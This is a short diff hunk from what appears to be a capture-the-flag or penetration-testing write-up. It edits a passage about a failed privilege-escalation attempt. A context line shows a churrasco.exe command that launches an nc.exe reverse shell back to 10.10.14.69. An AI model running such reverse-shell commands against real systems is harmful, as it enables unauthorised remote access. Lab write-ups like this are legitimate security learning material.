@@ -216,7 +216,7 @@ d----         6/10/2018   3:44 PM            vmware-SYSTEM
 
 I try running `churrasco.exe -d "nc.exe 10.10.14.69 1338 -e cmd.exe"`
 
-With a netcat listener open, but it does not work. Seems like I do not have access to running binaries.
+With a netcat listener open, but it does not work.
 
 I do have powershell possibilites though.
 
